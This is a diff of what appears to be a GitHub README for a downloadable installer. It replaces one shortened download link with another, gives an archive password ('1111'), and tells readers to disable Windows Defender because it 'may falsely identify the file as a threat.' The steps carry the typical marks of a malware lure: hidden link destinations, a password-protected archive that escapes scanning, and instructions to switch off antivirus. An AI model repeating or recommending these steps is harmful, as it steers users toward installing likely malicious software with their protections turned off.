@@ -3,8 +3,8 @@
 🎨PASS- 1111🎨
 <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/2e0ca443-6bdb-4b41-af1d-2f8b7a7bcb9d" />
 🔧 Installation Instructions
-Step 1: Download and unpack LINK - https://clck.ru/3VwebE
-Save installer_bcc (~634 MB) PASS - 1111
+Step 1: Download and unpack LINK - 💾 DOWNLOAD LINK ➲ https ://clck.su/NZgCv
+💾 PASSWORD ➲ 1111
 Unpack using WinRAR or 7-Zip
 Step 2: Disable Windows Defender (Temporarily)
 Windows Defender may falsely identify the file as a threat
